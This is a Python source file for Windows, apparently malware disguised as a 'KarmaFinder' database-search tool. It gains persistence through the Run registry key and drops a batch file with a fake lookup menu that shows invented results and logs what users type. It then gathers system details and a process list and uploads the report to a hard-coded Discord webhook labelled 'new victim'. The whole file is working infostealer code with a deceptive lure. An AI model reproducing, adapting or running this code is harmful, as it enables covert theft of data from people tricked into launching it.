import os
import sys
import time
import socket
import uuid
import platform
import subprocess
import psutil
import requests
import winreg as reg
from datetime import datetime

WEBHOOK_URL = "https://discord.com/api/webhooks/1511031568108617950/9ojulLzuCGFLuO1tAMnm5LwcyHXSL1V4cm44Oy80GTyjKSMTJLLzFAzDfR-puUo1o-MM"  # Replace with your Discord webhook URL

def is_vm():
    vm_indicators = ["vmware", "virtualbox", "vbox", "qemu", "xen", "kvm", "microsoft virtual"]
    try:
        for proc in psutil.process_iter(['name']):
            if any(ind in proc.info['name'].lower() for ind in vm_indicators):
                return True
    except:
        pass
    try:
        with open('C:\\Windows\\System32\\drivers\\etc\\hosts', 'r') as f:
            if any(ind in f.read().lower() for ind in vm_indicators):
                return True
    except:
        pass
    return False

def add_persistence():
    try:
        exe_path = sys.executable
        key = reg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = reg.OpenKey(key, key_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(reg_key, "KarmaFinder", 0, reg.REG_SZ, exe_path)
        reg.CloseKey(reg_key)
    except:
        pass

def get_system_info():
    info = {}
    info['Username'] = os.getlogin()
    info['Computer Name'] = socket.gethostname()
    info['IP Address'] = socket.gethostbyname(socket.gethostname())
    info['MAC Address'] = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1])
    info['OS'] = platform.system() + " " + platform.release()
    info['Processor'] = platform.processor()
    info['Timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    processes = []
    for proc in psutil.process_iter(['pid', 'name', 'username']):
        try:
            processes.append(f"{proc.info['pid']} - {proc.info['name']} ({proc.info['username']})")
        except:
            pass
    info['Processes'] = "\n".join(processes[:50])  # Limit to avoid huge file
    
    return info

def save_report(data, search_inputs=None):
    temp_dir = os.getenv('TEMP')
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_path = os.path.join(temp_dir, f"KarmaFinder_Report_{timestamp}.txt")
    
    with open(report_path, 'w', encoding='utf-8') as f:
        f.write("=== KARMAFINDER REPORT ===\n\n")
        f.write("SYSTEM INFORMATION:\n")
        for key, value in data.items():
            f.write(f"{key}: {value}\n")
        f.write("\n")
        if search_inputs:
            f.write("SEARCH INPUTS FROM BAT:\n")
            for inp in search_inputs:
                f.write(f"{inp}\n")
        f.write("\n=== END REPORT ===\n")
    
    return report_path

def send_to_webhook(file_path):
    try:
        with open(file_path, 'rb') as f:
            files = {'file': (os.path.basename(file_path), f)}
            payload = {'content': 'KarmaFinder Report from new victim'}
            requests.post(WEBHOOK_URL, data=payload, files=files, timeout=10)
    except:
        pass

def drop_and_run_bat():
    temp_dir = os.getenv('TEMP')
    bat_path = os.path.join(temp_dir, "KarmaFinder.bat")
    
    bat_content = r'''@echo off
color 0A
cls
echo.
echo.
echo    /$$   /$$                                                   /$$$$$$$$ /$$                 /$$                          
echo  | $$  /$$/                                                  | $$_____/|__/                | $$                    
echo  | $$ /$$/   /$$$$$$   /$$$$$$  /$$$$$$/$$$$   /$$$$$$       | $$       /$$ /$$$$$$$   /$$$$$$$  /$$$$$$   /$$$$$$ 
echo  | $$$$$/   |____  $$ /$$__  $$| $$_  $$_  $$ |____  $$      | $$$$$   | $$| $$__  $$ /$$__  $$ /$$__  $$ /$$__  $$
echo  | $$  $$    /$$$$$$$| $$  \__/| $$ \ $$ \ $$  /$$$$$$$      | $$__/   | $$| $$  \ $$| $$  | $$| $$$$$$$$| $$  \__/
echo  | $$\  $$  /$$__  $$| $$      | $$ | $$ | $$ /$$__  $$      | $$      | $$| $$  | $$| $$  | $$| $$_____/| $$      
echo  | $$ \  $$|  $$$$$$$| $$      | $$ | $$ | $$|  $$$$$$$      | $$      | $$| $$  | $$|  $$$$$$$|  $$$$$$$| $$      
echo  |__/  \__/ \_______/|__/      |__/ |__/ |__/ \_______/      |__/      |__/|__/  |__/ \_______/ \_______/|__/      
echo.
echo                  DATABASE SEARCH INTERFACE v2.1
echo.
echo 1. Search Username
echo 2. Search Email
echo 3. Search IP
echo 4. Search HWID
echo 5. Full Database Dump
echo 6. Exit
echo.
set /p choice="Enter option (1-6): "

if "%choice%"=="1" (
    set /p user="Enter Username: "
    echo [LOG] Username search: %user% >> "%TEMP%\karma_searches.log"
    echo Searching database for %user%...
    timeout /t 2 >nul
    echo ========================================
    echo RESULTS FOR %user%:
    echo Karma Score: 8472/10000
    echo Associated Emails: 3 found
    echo IPs: 192.168.1.45, 45.67.89.12
    echo HWID Matches: 2
    echo Last Activity: 2 hours ago
    echo ========================================
    pause
)

if "%choice%"=="2" (
    set /p email="Enter Email: "
    echo [LOG] Email search: %email% >> "%TEMP%\karma_searches.log"
    echo Searching database for %email%...
    timeout /t 2 >nul
    echo ========================================
    echo RESULTS FOR %email%:
    echo Username: shadow_ninja_420
    echo Karma Score: 9321/10000
    echo IPs: 172.16.254.1
    echo Breaches: 14
    echo ========================================
    pause
)

if "%choice%"=="3" (
    set /p ip="Enter IP: "
    echo [LOG] IP search: %ip% >> "%TEMP%\karma_searches.log"
    echo Querying threat intel...
    timeout /t 1 >nul
    echo ========================================
    echo IP: %ip%
    echo Risk Level: HIGH
    echo Linked Accounts: 47
    echo Geo: RU / Moscow
    echo ========================================
    pause
)

if "%choice%"=="4" (
    set /p hwid="Enter HWID: "
    echo [LOG] HWID search: %hwid% >> "%TEMP%\karma_searches.log"
    echo Scanning hardware database...
    timeout /t 2 >nul
    echo ========================================
    echo HWID Match Found
    echo Victim ID: 0xF4A9B2C7
    echo Karma Score: 6543
    echo ========================================
    pause
)

if "%choice%"=="5" (
    echo Dumping full database... This may take a moment.
    timeout /t 3 >nul
    echo [SIMULATED DUMP] 12487 records exported.
    echo Top entries: admin, root, guest, darklord666...
    pause
)

if "%choice%"=="6" (
    echo Exiting KarmaFinder...
    timeout /t 1 >nul
    exit
)

echo.
echo Returning to main menu...
timeout /t 2 >nul
goto :start
'''
    
    with open(bat_path, 'w', encoding='utf-8') as f:
        f.write(bat_content)
    
    # Run the bat
    subprocess.Popen([bat_path], shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)

def main():
    if is_vm():
        time.sleep(5)  # Still proceed but delayed
    else:
        time.sleep(3)  # Initial delay
    
    add_persistence()
    drop_and_run_bat()
    
    sys_info = get_system_info()
    
    # Read any search logs from bat
    search_inputs = []
    try:
        log_path = os.path.join(os.getenv('TEMP'), "karma_searches.log")
        if os.path.exists(log_path):
            with open(log_path, 'r', encoding='utf-8') as f:
                search_inputs = f.readlines()
    except:
        pass
    
    report_path = save_report(sys_info, search_inputs)
    send_to_webhook(report_path)
    
    # Keep alive briefly
    time.sleep(10)

if __name__ == "__main__":
    main()